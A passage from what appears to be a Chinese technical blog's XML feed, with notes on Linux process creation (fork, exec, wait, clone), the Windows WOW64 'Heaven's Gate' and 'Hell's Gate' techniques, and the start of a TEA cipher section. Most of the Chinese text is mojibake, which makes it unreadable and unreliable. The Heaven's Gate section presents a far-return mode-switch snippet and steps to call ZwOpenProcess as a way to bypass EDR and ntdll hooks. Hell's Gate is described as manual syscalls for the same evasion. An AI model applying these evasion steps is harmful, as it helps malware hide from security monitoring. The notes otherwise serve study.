ä¸‹çº¿ç¨‹é”å’Œé«˜æ€§èƒ½é”çš„åº•å±‚æœºåˆ¶ã€‚</li><li>ç”¨æˆ·æ€åŠ é”ï¼Œåªæœ‰åœ¨å†²çªæ—¶æ‰é™·å…¥å†…æ ¸ã€‚</li></ul><h2 id="å¥—æ¥å­—ç±»é€šä¿¡ï¼ˆsocketï¼‰"><a href="#å¥—æ¥å­—ç±»é€šä¿¡ï¼ˆsocketï¼‰" class="headerlink" title="å¥—æ¥å­—ç±»é€šä¿¡ï¼ˆsocketï¼‰"></a>å¥—æ¥å­—ç±»é€šä¿¡ï¼ˆsocketï¼‰</h2><ul><li>ç”¨äºæœ¬æœºä¸¤ä¸ªè¿›ç¨‹ä¹‹é—´çš„å…¨åŠŸèƒ½é€šä¿¡ã€‚</li><li>ä¸ç½‘ç»œ socket ä½¿ç”¨æ–¹å¼ä¸€è‡´ï¼Œæ”¯æŒ selectã€epoll ç­‰æœºåˆ¶ã€‚</li></ul><h1 id="è¿›ç¨‹ä¸çº¿ç¨‹çš„åˆ›å»ºå’Œè°ƒåº¦æœºåˆ¶"><a href="#è¿›ç¨‹ä¸çº¿ç¨‹çš„åˆ›å»ºå’Œè°ƒåº¦æœºåˆ¶" class="headerlink" title="è¿›ç¨‹ä¸çº¿ç¨‹çš„åˆ›å»ºå’Œè°ƒåº¦æœºåˆ¶"></a>è¿›ç¨‹ä¸çº¿ç¨‹çš„åˆ›å»ºå’Œè°ƒåº¦æœºåˆ¶</h1><h2 id="fork-ï¼šåˆ›å»ºå­è¿›ç¨‹"><a href="#fork-ï¼šåˆ›å»ºå­è¿›ç¨‹" class="headerlink" title="fork()ï¼šåˆ›å»ºå­è¿›ç¨‹"></a>fork()ï¼šåˆ›å»ºå­è¿›ç¨‹</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">pid_t</span> pid = fork();</span><br></pre></td></tr></table></figure><ul><li><p><strong>ä½œç”¨</strong>ï¼šå¤åˆ¶å½“å‰è¿›ç¨‹ï¼Œåˆ›å»ºä¸€ä¸ª<strong>å‡ ä¹å®Œå…¨ç›¸åŒ</strong>çš„å­è¿›ç¨‹ã€‚</p></li><li><p>çˆ¶å­è¿›ç¨‹æ‹¥æœ‰<strong>ç‹¬ç«‹</strong>çš„åœ°å€ç©ºé—´ã€‚</p></li><li><p>å­è¿›ç¨‹ä¼šç»§æ‰¿çˆ¶è¿›ç¨‹çš„å¤§éƒ¨åˆ†èµ„æºï¼ˆå¦‚æ–‡ä»¶æè¿°ç¬¦ã€å †æ ˆç­‰ï¼‰ã€‚</p></li></ul><p><strong>è¿”å›å€¼ï¼š</strong></p><ul><li>çˆ¶è¿›ç¨‹ï¼šfork() è¿”å›å­è¿›ç¨‹çš„ PIDã€‚</li><li>å­è¿›ç¨‹ï¼šfork() è¿”å› 0ã€‚</li><li>é”™è¯¯æ—¶è¿”å› -1ã€‚<blockquote><p>æ³¨æ„ï¼šçˆ¶å­è¿›ç¨‹<strong>åœ°å€ç©ºé—´æ˜¯å¤åˆ¶çš„ï¼Œä½†å½¼æ­¤ç‹¬ç«‹</strong>ï¼ˆå†™æ—¶å¤åˆ¶æœºåˆ¶COWï¼‰ã€‚</p></blockquote></li></ul><h3 id="å¤šçº¿ç¨‹è¿›ç¨‹è°ƒç”¨forkï¼ˆï¼‰æ—¶"><a href="#å¤šçº¿ç¨‹è¿›ç¨‹è°ƒç”¨forkï¼ˆï¼‰æ—¶" class="headerlink" title="å¤šçº¿ç¨‹è¿›ç¨‹è°ƒç”¨forkï¼ˆï¼‰æ—¶"></a>å¤šçº¿ç¨‹è¿›ç¨‹è°ƒç”¨forkï¼ˆï¼‰æ—¶</h3><p><strong>ä»…ä¼šå°†å‘èµ·è°ƒç”¨çš„çº¿ç¨‹å¤åˆ¶åˆ°å­è¿›ç¨‹ä¸­</strong>ã€‚å­è¿›ç¨‹ä¸­è¯¥çº¿ç¨‹çš„çº¿ç¨‹IDä¸çˆ¶è¿›ç¨‹ä¸­å‘èµ·forkï¼ˆï¼‰è°ƒç”¨çº¿ç¨‹çš„çº¿ç¨‹IDç›¸ä¸€è‡´ã€‚<br>å…¶ä»–çº¿ç¨‹å‡åœ¨å­è¿›ç¨‹ä¸­æ¶ˆå¤±ï¼Œä¹Ÿä¸ä¼šä¸ºè¿™äº›çº¿ç¨‹è°ƒç”¨æ¸…ç†å‡½æ•°ä»¥åŠé’ˆå¯¹çº¿ç¨‹ç‰¹æœ‰æ•°æ®çš„è§£æ„å‡½æ•°ã€‚</p><h3 id="forkçš„ä¸¤ä¸ªå…¸å‹ç”¨æ³•"><a href="#forkçš„ä¸¤ä¸ªå…¸å‹ç”¨æ³•" class="headerlink" title="forkçš„ä¸¤ä¸ªå…¸å‹ç”¨æ³•"></a>forkçš„ä¸¤ä¸ªå…¸å‹ç”¨æ³•</h3><p>(1) ä¸€ä¸ªè¿›ç¨‹åˆ›å»ºä¸€ä¸ªè‡ªèº«çš„å‰¯æœ¬</p><ul><li>ç½‘ç»œæœåŠ¡å™¨çš„å…¸å‹ç”¨æ³•ã€‚</li></ul><p>(2) ä¸€ä¸ªè¿›ç¨‹æƒ³è¦æ‰§è¡Œå¦ä¸€ä¸ªç¨‹åºã€‚é¦–å…ˆè°ƒç”¨forkåˆ›å»ºä¸€ä¸ªè‡ªèº«çš„å‰¯æœ¬ï¼Œç„¶åå…¶ä¸­ä¸€ä¸ªå­è¿›ç¨‹è°ƒç”¨execæŠŠè‡ªèº«æ›¿æ¢æˆæ–°çš„ç¨‹åºã€‚</p><ul><li>shellä¹‹ç±»ç¨‹åºçš„å…¸å‹ç”¨æ³•ã€‚</li></ul><h3 id="pid-ä¸-ppid"><a href="#pid-ä¸-ppid" class="headerlink" title="pid ä¸ ppid"></a>pid ä¸ ppid</h3><p>pidï¼ˆProcess IDï¼‰ï¼šè¿›ç¨‹çš„å”¯ä¸€æ ‡è¯†ï¼Œç”±<strong>å†…æ ¸åˆ†é…</strong>ã€‚</p><p>ppidï¼ˆParent PIDï¼‰ï¼šçˆ¶è¿›ç¨‹çš„ pidï¼Œåœ¨ task_struct ä¸­é€šè¿‡ real_parent å­—æ®µå¼•ç”¨ã€‚</p><blockquote><p>å½“çˆ¶è¿›ç¨‹ç»“æŸï¼Œå­è¿›ç¨‹çš„ ppid ä¼šè¢«è‡ªåŠ¨æ”¹ä¸º 1ï¼Œå³ initï¼ˆæˆ– systemdï¼‰æ¥ç®¡ï¼Œé˜²æ­¢å‡ºç°å­¤å„¿è¿›ç¨‹ã€‚</p></blockquote><h2 id="exec-ï¼šæ‰§è¡Œæ–°ç¨‹åºï¼ˆæ›¿æ¢å½“å‰è¿›ç¨‹æ˜ åƒï¼‰"><a href="#exec-ï¼šæ‰§è¡Œæ–°ç¨‹åºï¼ˆæ›¿æ¢å½“å‰è¿›ç¨‹æ˜ åƒï¼‰" class="headerlink" title="exec*()ï¼šæ‰§è¡Œæ–°ç¨‹åºï¼ˆæ›¿æ¢å½“å‰è¿›ç¨‹æ˜ åƒï¼‰"></a>exec*()ï¼šæ‰§è¡Œæ–°ç¨‹åºï¼ˆæ›¿æ¢å½“å‰è¿›ç¨‹æ˜ åƒï¼‰</h2><p>çˆ¶è¿›ç¨‹éœ€è¦ç­‰å¾…å­è¿›ç¨‹æ‰§è¡Œå®Œæ¯•ï¼Œä»¥å›æ”¶å…¶èµ„æºï¼ˆå¦åˆ™å­è¿›ç¨‹å¯èƒ½å˜æˆ<strong>åƒµå°¸è¿›ç¨‹</strong>ï¼ŒZçŠ¶æ€ï¼‰ã€‚<br><strong>ä½œç”¨</strong>ï¼šç”¨ä¸€ä¸ªæ–°ç¨‹åºæ›¿æ¢å½“å‰è¿›ç¨‹ç©ºé—´ï¼Œä¿ç•™ PIDã€‚<br><strong>ä¸ä¼šè¿”å›</strong>ï¼šé™¤éå‡ºé”™ï¼Œå¦åˆ™ exec() æˆåŠŸè°ƒç”¨åï¼Œä¸ä¼šè¿”å›åŸç¨‹åºã€‚</p><h2 id="wait-å’Œ-waitpid-ï¼šè¿›ç¨‹å›æ”¶"><a href="#wait-å’Œ-waitpid-ï¼šè¿›ç¨‹å›æ”¶" class="headerlink" title="wait() å’Œ waitpid()ï¼šè¿›ç¨‹å›æ”¶"></a><code>wait()</code> å’Œ <code>waitpid()</code>ï¼šè¿›ç¨‹å›æ”¶</h2><ul><li><p><code>wait(</code>)`ï¼šé˜»å¡å½“å‰çˆ¶è¿›ç¨‹ï¼Œç›´åˆ°æœ‰å­è¿›ç¨‹é€€å‡ºã€‚<br>è¿”å›å€¼ï¼šå·²ç»“æŸå­è¿›ç¨‹çš„ PIDã€‚</p></li><li><p><code>waitpid(pid, &amp;status, options)</code>ï¼š</p><ul><li>å¯ç­‰å¾…ç‰¹å®š PIDï¼›</li><li>å¯è®¾ç½®éé˜»å¡ï¼ˆå¦‚ WNOHANGï¼‰ï¼›</li><li>status ä¸­å¯è§£ç é€€å‡ºçŠ¶æ€ã€‚</li></ul></li></ul><p>åƒµå°¸è¿›ç¨‹å‡ºç°çš„åŸå› ï¼š</p><ul><li>å­è¿›ç¨‹é€€å‡ºåï¼Œä»ä¿ç•™å…¶ task_struct ä¸­çš„ä¸€éƒ¨åˆ†ï¼ˆå¦‚é€€å‡ºç ï¼‰ä¾›çˆ¶è¿›ç¨‹è¯»å–ã€‚</li><li>å¦‚æœçˆ¶è¿›ç¨‹ä»ä¸è°ƒç”¨ wait()ï¼Œå­è¿›ç¨‹é€€å‡ºåå°±ä¼šä¸€ç›´æ®‹ç•™åœ¨ Z çŠ¶æ€ã€‚</li></ul><p>Linux å†…æ ¸ä¼šé€šè¿‡ <code>do_exit() â†’ release_task()</code> æ¥æ¸…ç†èµ„æºã€‚</p><h2 id="clone-ï¼šçº¿ç¨‹çš„åŸºç¡€"><a href="#clone-ï¼šçº¿ç¨‹çš„åŸºç¡€" class="headerlink" title="clone()ï¼šçº¿ç¨‹çš„åŸºç¡€"></a><code>clone()</code>ï¼šçº¿ç¨‹çš„åŸºç¡€</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">clone</span><span class="params">(<span class="type">int</span> (*fn)(<span class="type">void</span> *), <span class="type">void</span> *child_stack, <span class="type">int</span> flags, <span class="type">void</span> *arg)</span>;</span><br></pre></td></tr></table></figure><p><strong>ä½œç”¨</strong>ï¼šåº•å±‚çš„çº¿ç¨‹/è¿›ç¨‹åˆ›å»ºç³»ç»Ÿè°ƒç”¨ï¼Œæ¯” fork() æ›´çµæ´»ã€‚<br>pthread_create()ã€vfork() ç­‰é«˜çº§æ¥å£çš„å®ç°ã€‚<br><strong>å‚æ•°</strong>ï¼šä¼ å…¥ä¸€å † flag æ§åˆ¶èµ„æºå…±äº«æ–¹å¼ï¼ˆå†…å­˜ç©ºé—´ã€æ–‡ä»¶æè¿°ç¬¦ã€ä¿¡å·å¤„ç†ç­‰ï¼‰ã€‚</p><ul><li><code>CLONE_VM</code>ï¼šå…±äº«å†…å­˜ç©ºé—´ï¼›</li><li><code>CLONE_FS</code>ï¼šå…±äº«æ–‡ä»¶ç³»ç»Ÿä¿¡æ¯ï¼›</li><li><code>CLONE_FILES</code>ï¼šå…±äº«æ–‡ä»¶æè¿°ç¬¦ï¼›</li><li><code>CLONE_SIGHAND</code>: å…±äº«ä¿¡å·å¤„ç†å™¨</li><li><code>CLONE_THREAD</code>ï¼šæ ‡è®°ä¸ºåŒä¸€çº¿ç¨‹ç»„ã€‚</li></ul><p>clone() çš„å…³é”®ç‚¹ï¼š</p><ul><li>flags å‚æ•°å†³å®šå­è¿›ç¨‹ä¸çˆ¶è¿›ç¨‹å…±äº«å“ªäº›èµ„æºã€‚</li><li>åˆ›å»ºâ€œçº¿ç¨‹â€çš„å…³é”®æ˜¯è®¾ç½®åˆé€‚çš„ flags</li></ul><p>Qï¼šLinux ä¸­çº¿ç¨‹æ˜¯å¦‚ä½•å®ç°çš„ï¼Ÿ<br>Aï¼šçº¿ç¨‹æ˜¯é€šè¿‡ clone() ç³»ç»Ÿè°ƒç”¨åˆ›å»ºçš„è½»é‡çº§è¿›ç¨‹ï¼Œå¤šä¸ªçº¿ç¨‹å…±äº«åŒä¸€ task çš„èµ„æºã€‚</p>]]></content>
      
      
      <categories>
          
          <category> ç¬”è®°æ•´ç† </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
            <tag> å¤šçº¿ç¨‹ </tag>
            
            <tag> os </tag>
            
            <tag> äºŒè¿›åˆ¶é€šè¯† </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Heaven&#39;s Gate</title>
      <link href="/2025/07/07/%E5%A4%A9%E5%A0%82%E4%B9%8B%E9%97%A8or%E5%9C%B0%E7%8B%B1%E4%B9%8B%E9%97%A8/"/>
      <url>/2025/07/07/%E5%A4%A9%E5%A0%82%E4%B9%8B%E9%97%A8or%E5%9C%B0%E7%8B%B1%E4%B9%8B%E9%97%A8/</url>
      
        <content type="html"><![CDATA[<h1 id="å¤©å ‚ä¹‹é—¨"><a href="#å¤©å ‚ä¹‹é—¨" class="headerlink" title="å¤©å ‚ä¹‹é—¨"></a>å¤©å ‚ä¹‹é—¨</h1><h2 id="å‰ç½®çŸ¥è¯†"><a href="#å‰ç½®çŸ¥è¯†" class="headerlink" title="å‰ç½®çŸ¥è¯†"></a>å‰ç½®çŸ¥è¯†</h2><h3 id="Windows-æ¶æ„æ¦‚è§ˆ"><a href="#Windows-æ¶æ„æ¦‚è§ˆ" class="headerlink" title="Windows æ¶æ„æ¦‚è§ˆ"></a>Windows æ¶æ„æ¦‚è§ˆ</h3><div class="table-container"><table><thead><tr><th>ç”¨æˆ·å±‚</th><th>å†…æ ¸å±‚</th></tr></thead><tbody><tr><td>32 ä½æˆ– 64 ä½è¿›ç¨‹</td><td>å§‹ç»ˆä¸º 64 ä½å†…æ ¸</td></tr></tbody></table></div><ul><li>Windows çš„å†…æ ¸ï¼ˆntoskrnl.exeï¼‰<strong>æ°¸è¿œæ˜¯ 64 ä½</strong>ã€‚</li><li>å³ä½¿è¿è¡Œçš„æ˜¯ 32 ä½ç¨‹åºï¼Œå®ƒä¹Ÿæ˜¯é€šè¿‡ WOW64 å­ç³»ç»Ÿï¼ˆWindows-on-Windows64ï¼‰ æ¨¡æ‹Ÿè¿è¡Œçš„</li></ul><h3 id="WOW64"><a href="#WOW64" class="headerlink" title="WOW64"></a>WOW64</h3><p>WOW64 æ˜¯ Windows x64 ç³»ç»Ÿçš„ä¸€ä¸ªå…¼å®¹å­ç³»ç»Ÿï¼Œç”¨äºæ”¯æŒ 32 ä½åº”ç”¨çš„è¿è¡Œã€‚</p><blockquote><p>åœ¨ 64 ä½ç³»ç»Ÿä¸­ä¸º 32 ä½ç¨‹åºæä¾›ä¸€ä¸ªè¿è¡Œæ—¶ç¯å¢ƒã€‚</p></blockquote><p>WOW64 çš„ä¸‰å¤§ç»„ä»¶ï¼š<br>| æ¨¡å—               | ä½æ•°   | ä½œç”¨                      |<br>| â€”â€”â€”â€”â€”â€”â€”â€” | â€”â€” | â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”- |<br>| <strong>wow64.dll</strong>    | 32 ä½ | æ¡¥æ¥å±‚ï¼Œå°† 32 â†’ 64 ä½å‚æ•°å°è£…     |<br>| <strong>wow64win.dll</strong> | 64 ä½ | å¤„ç† GUI / ç”¨æˆ·æ¨¡å¼æ¥å£         |<br>| <strong>wow64cpu.dll</strong> | 64 ä½ | CPU ä¸Šçš„ thunk æœºåˆ¶ï¼ˆåˆ‡æ¢æ‰§è¡Œæ¨¡å¼ï¼‰ |</p><ul><li>æ‹¦æˆª 32 ä½ç¨‹åºå¯¹ç³»ç»Ÿè°ƒç”¨çš„è¯·æ±‚</li><li>è½¬æ¢æˆ 64 ä½è°ƒç”¨ï¼Œå¹¶åœ¨å†…æ ¸ä¸­æ‰§è¡Œ</li><li>å†æŠŠç»“æœè½¬æ¢å› 32 ä½ï¼Œè¿”å›ç»™åŸç¨‹åº</li></ul><h3 id="CPU-åˆ†æ®µæ¨¡å‹"><a href="#CPU-åˆ†æ®µæ¨¡å‹" class="headerlink" title="CPU åˆ†æ®µæ¨¡å‹"></a>CPU åˆ†æ®µæ¨¡å‹</h3><ul><li><p>x86 CPU ä½¿ç”¨æ®µé€‰æ‹©å­ï¼ˆSegment Selectorï¼‰æ§åˆ¶ä»£ç åœ¨å“ªä¸ªæ®µæ‰§è¡Œã€‚</p></li><li><p>æ¯ä¸ªä»£ç æ®µæœ‰ä¸€ä¸ªæè¿°ç¬¦ï¼Œæ§åˆ¶ï¼šåŸºå€ã€æƒé™ã€ä½æ•°ï¼ˆ32/64ï¼‰ç­‰</p><ul><li><p><code>0x23</code>æ˜¯ 32 ä½ä»£ç æ®µï¼ˆå¸¸è§äºç”¨æˆ·å±‚ï¼‰</p></li><li><p><code>0x33</code>æ˜¯ 64 ä½ä»£ç æ®µï¼ˆWOW64 ç¯å¢ƒä¸­çš„64æ®µï¼‰</p></li></ul></li></ul><h3 id="ret-ä¸-retf"><a href="#ret-ä¸-retf" class="headerlink" title="ret ä¸ retf"></a>ret ä¸ retf</h3><div class="table-container"><table><thead><tr><th>æŒ‡ä»¤</th><th>åŠŸèƒ½</th></tr></thead><tbody><tr><td><code>ret</code></td><td>åª pop ä¸€ä¸ªè¿”å›åœ°å€ï¼Œ<strong>è¿”å›å½“å‰ä»£ç æ®µå†…</strong></td></tr><tr><td><code>retf</code></td><td>pop è¿”å›åœ°å€ + æ®µé€‰æ‹©å­ï¼Œ<strong>è¿”å›å…¶ä»–æ®µï¼ˆè·¨æ®µï¼‰</strong></td></tr></tbody></table></div><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">push 0x33         ; 64 ä½æ®µé€‰æ‹©å­</span><br><span class="line">push addr         ; ç›®æ ‡RIPï¼ˆ64ä½ä»£ç åœ°å€ï¼‰</span><br><span class="line">retf              ; --&gt; åˆ‡æ¢åˆ° 64 ä½ä»£ç æ®µ</span><br></pre></td></tr></table></figure><p>æ”¹å˜ CS:RIP ä¸º 0x33:addrï¼Œä»è€Œè·³åˆ° 64 ä½æ¨¡å¼</p><blockquote><p>retfæ˜¯32è½¬64ï¼Œretfqæ˜¯64è½¬32ä½ã€‚</p></blockquote><h2 id="Heavenâ€™s-Gate"><a href="#Heavenâ€™s-Gate" class="headerlink" title="Heavenâ€™s Gate"></a>Heavenâ€™s Gate</h2><h3 id="å®šä¹‰"><a href="#å®šä¹‰" class="headerlink" title="å®šä¹‰"></a>å®šä¹‰</h3><p>å¤©å ‚ä¹‹é—¨Heavenâ€™s Gate æ˜¯ä¸€ç§åœ¨32ä½WoW64è¿›ç¨‹ä¸­æ‰§è¡Œ64ä½ä»£ç ï¼Œä»¥åŠç›´æ¥è°ƒç”¨64ä½WIN32 APIå‡½æ•°çš„æŠ€æœ¯ã€‚</p><ul><li>åœ¨ 32 ä½è¿›ç¨‹ä¸­æ‰§è¡Œ 64 ä½ç³»ç»Ÿè°ƒç”¨</li><li>ç»•è¿‡æŸäº›å¯¹ 32 ä½ API Hook çš„ç›‘æ§ï¼ˆä¾‹å¦‚ ntdll.dll inline hookï¼‰</li></ul><h2 id="åŸç†"><a href="#åŸç†" class="headerlink" title="åŸç†"></a>åŸç†</h2><h3 id="32-ä½ç¨‹åºæ‰§è¡Œè¿‡ç¨‹"><a href="#32-ä½ç¨‹åºæ‰§è¡Œè¿‡ç¨‹" class="headerlink" title="32 ä½ç¨‹åºæ‰§è¡Œè¿‡ç¨‹"></a>32 ä½ç¨‹åºæ‰§è¡Œè¿‡ç¨‹</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">[32ä½ç¨‹åº]</span><br><span class="line">    â†“</span><br><span class="line">user32.dllï¼ˆ32ä½ï¼‰</span><br><span class="line">    â†“</span><br><span class="line">kernel32.dllï¼ˆ32ä½ï¼‰</span><br><span class="line">    â†“</span><br><span class="line">ntdll.dllï¼ˆ32ä½ï¼‰        â† EDRç»å¸¸hookè¿™é‡Œ</span><br><span class="line">    â†“</span><br><span class="line">WOW64ï¼ˆæ¨¡å¼åˆ‡æ¢ï¼‰</span><br><span class="line">    â†“</span><br><span class="line">ntdll.dllï¼ˆ64ä½ï¼‰        â† çœŸæ­£æ‰§è¡Œ syscall</span><br><span class="line">    â†“</span><br><span class="line">syscall â†’ å†…æ ¸å‡½æ•°</span><br></pre></td></tr></table></figure><ul><li>åœ¨ 32 ä½ç³»ç»Ÿé‡Œï¼Œè¿›å…¥å†…æ ¸å¸¸ç”¨çš„æ˜¯ <code>int 0x2e</code></li><li>åœ¨ 64 ä½ç³»ç»Ÿä¸­ï¼Œè¿›å…¥å†…æ ¸çš„æ˜¯ <code>syscall</code> æŒ‡ä»¤</li></ul><h3 id="WOW64-åˆ‡æ¢æµç¨‹"><a href="#WOW64-åˆ‡æ¢æµç¨‹" class="headerlink" title="WOW64 åˆ‡æ¢æµç¨‹"></a>WOW64 åˆ‡æ¢æµç¨‹</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">   32ä½ç¨‹åº</span><br><span class="line">       â”‚</span><br><span class="line">       â–¼</span><br><span class="line"> ntdll.dll (32ä½)</span><br><span class="line">       â”‚</span><br><span class="line">       â–¼</span><br><span class="line"> wow64.dll (32ä½)</span><br><span class="line">       â”‚</span><br><span class="line">       â–¼  â† é€šè¿‡ INT 2E or Wow64Transition</span><br><span class="line"> CPU åˆ‡æ¢åˆ° 64 ä½ï¼ˆvia wow64cpu.dllï¼‰</span><br><span class="line">       â”‚</span><br><span class="line">       â–¼</span><br><span class="line"> ntdll.dll (64ä½)</span><br><span class="line">       â”‚</span><br><span class="line">       â–¼</span><br><span class="line">   syscall</span><br><span class="line">       â”‚</span><br><span class="line">       â–¼</span><br><span class="line">ntoskrnl.exeï¼ˆå†…æ ¸ï¼‰ </span><br></pre></td></tr></table></figure><p><strong>Wow64Transition</strong>:é€šè¿‡ CPU ç‰¹æ®ŠæŒ‡ä»¤å’Œä¸Šä¸‹æ–‡è½¬æ¢ï¼Œè®©ç”¨æˆ·æ€çº¿ç¨‹ä» 32 ä½ä»£ç æ®µè·³å…¥ 64 ä½æ®µæ‰§è¡Œ</p><h3 id="å¤©å ‚ä¹‹é—¨çš„å®ç°æ€è·¯"><a href="#å¤©å ‚ä¹‹é—¨çš„å®ç°æ€è·¯" class="headerlink" title="å¤©å ‚ä¹‹é—¨çš„å®ç°æ€è·¯"></a>å¤©å ‚ä¹‹é—¨çš„å®ç°æ€è·¯</h3><p>1ã€å°†csæ®µå¯„å­˜å™¨è®¾ä¸º0x33ï¼Œåˆ‡æ¢åˆ°64ä½æ¨¡å¼<br>2ã€ä»gs:0x60è¯»å–64ä½PEB<br>3ã€ä»64ä½PEBä¸­å®šä½64ä½ntdllåŸºå€<br>4ã€éå†ntdll64å¯¼å‡ºè¡¨ï¼Œè¯»å–ZwOpenProcesså‡½æ•°åœ°å€<br>5ã€æ„é€ 64ä½å‡½æ•°è°ƒç”¨</p><p>å¦‚æœéœ€è¦è°ƒç”¨çš„æ˜¯ntdllä¹‹å¤–çš„å‡½æ•°ï¼Œä»¥kernel32.dllä¸­çš„CreateFileå‡½æ•°ä¸ºä¾‹ï¼Œè¿˜éœ€è¦ï¼š<br>1ã€éå†ntdll64å¯¼å‡ºè¡¨ï¼Œè¯»å–LdrLoadDllå‡½æ•°åœ°å€<br>2ã€è°ƒç”¨LdrLoadDll(â€œkernel32.dllâ€)åŠ è½½64ä½kernel32.dll<br>3ã€ä»64ä½çš„kernel32ä¸­è¯»å–GetProcAddressç­‰å‡½æ•°ï¼Œè·å–CreateFileå‡½æ•°åœ°å€<br>4ã€è°ƒç”¨CreateFileå‡½æ•°</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">push 0x33         ; 64 ä½ä»£ç æ®µ</span><br><span class="line">push offset_64    ; 64 ä½ä»£ç åœ°å€</span><br><span class="line">retf              ; çœŸæ­£è·³åˆ° 64 ä½æ‰§è¡Œ</span><br></pre></td></tr></table></figure><blockquote><p>æ‹œè¯»æ–‡ç« ï¼š<br>    <a href="https://bbs.kanxue.com/thread-270153.htm"> [åŸåˆ›]å¤©å ‚ä¹‹é—¨ (Heavenâ€™s Gate) Cè¯­è¨€å®ç°</a><br>    <a href="https://wbenny.github.io/2018/11/04/wow64-internals.html">WoW64 å†…éƒ¨ç»“æ„</a><br>    <a href="https://clovershrub.github.io/2024/02/02/%E5%A4%A9%E5%A0%82%E4%B9%8B%E9%97%A8/index.html">å¤©å ‚ä¹‹é—¨</a></p></blockquote><h1 id="åœ°ç‹±ä¹‹é—¨"><a href="#åœ°ç‹±ä¹‹é—¨" class="headerlink" title="åœ°ç‹±ä¹‹é—¨"></a>åœ°ç‹±ä¹‹é—¨</h1><p>åœ°ç‹±ä¹‹é—¨æ˜¯ä¸€ç§åœ¨<strong>64 ä½è¿›ç¨‹ä¸­ä¸»åŠ¨æ„é€ ç³»ç»Ÿè°ƒç”¨æŒ‡ä»¤ syscall</strong> çš„æ–¹æ³•ï¼Œç›®çš„æ˜¯<strong>ç»•è¿‡ç”¨æˆ·å±‚ API</strong>ï¼ˆå¦‚ ntdll.dllï¼‰çš„ Hook ä¸ç›‘æ§ã€‚</p><p>ä¼ ç»Ÿçš„ç³»ç»Ÿè°ƒç”¨è·¯å¾„ï¼š<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Program â†’ ntdll.dll â†’ syscall</span><br></pre></td></tr></table></figure><br>åœ°ç‹±ä¹‹é—¨:<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Program â†’ è¯»å– ntdll.dll â†’ è§£æ syscall ID â†’ æ‰‹åŠ¨ syscall</span><br></pre></td></tr></table></figure></p>]]></content>
      
      
      <categories>
          
          <category> ç¬”è®°æ•´ç† </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Windows </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>å¸¸è§åŠ å¯†ç®—æ³•æ•´ç†</title>
      <link href="/2025/07/06/%E5%B8%B8%E8%A7%81%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95%E6%95%B4%E7%90%86/"/>
      <url>/2025/07/06/%E5%B8%B8%E8%A7%81%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95%E6%95%B4%E7%90%86/</url>
      
        <content type="html"><![CDATA[<h1 id="TEAå®¶æ—"><a href="#TEAå®¶æ—" class="headerlink" title="TEAå®¶æ—"></a>TEAå®¶æ—</h1><p><strong>TEAç®—æ³•æ¯ä¸€æ¬¡å¯ä»¥æ“ä½œ64bit(8byte)ï¼Œé‡‡ç”¨128bit(16byte)ä½œä¸ºkeyï¼Œç®—æ³•é‡‡ç”¨è¿­ä»£çš„å½¢å¼ï¼Œæ¨èçš„è¿­ä»£è½®æ•°æ˜¯64è½®ï¼Œæœ€å°‘32è½®(å¯ä»¥æ”¹å˜)ã€‚</strong></p><p>TEAç³»åˆ—ç®—æ³•ä¸­å‡ä½¿ç”¨äº†ä¸€ä¸ª<strong>DELTAå¸¸æ•°</strong>ï¼Œä½†DELTAçš„å€¼å¯¹ç®—æ³•å¹¶æ— ä»€ä¹ˆå½±å“ï¼Œåªæ˜¯ä¸ºäº†é¿å…ä¸è‰¯çš„å–å€¼ï¼Œæ¨èDELTAçš„å€¼å–ä¸ºé»„é‡‘åˆ†å‰²æ•°(5âˆš-2)/2ä¸232çš„ä¹˜ç§¯ï¼Œå–æ•´åçš„åå…­è¿›åˆ¶å€¼ä¸º<strong>0x9e3779B9</strong>(ä¹Ÿå¯ä»¥æ”¹å˜)ï¼Œç”¨äºä¿è¯æ¯ä¸€è½®åŠ å¯†éƒ½ä¸ç›¸åŒã€‚</p><p><strong>XTEA</strong>ï¼šä½¿ç”¨ä¸TEAç›¸åŒçš„ç®€å•è¿ç®—ï¼Œä½†å››ä¸ªå­å¯†é’¥é‡‡å–ä¸æ­£è§„çš„æ–¹å¼è¿›è¡Œæ··åˆä»¥é˜»æ­¢å¯†é’¥è¡¨æ”»å‡»ã€‚<br>Block TEAç®—æ³•å¯ä»¥å¯¹32ä½çš„ä»»æ„æ•´æ•°å€é•¿åº¦çš„å˜é‡å—è¿›è¡ŒåŠ 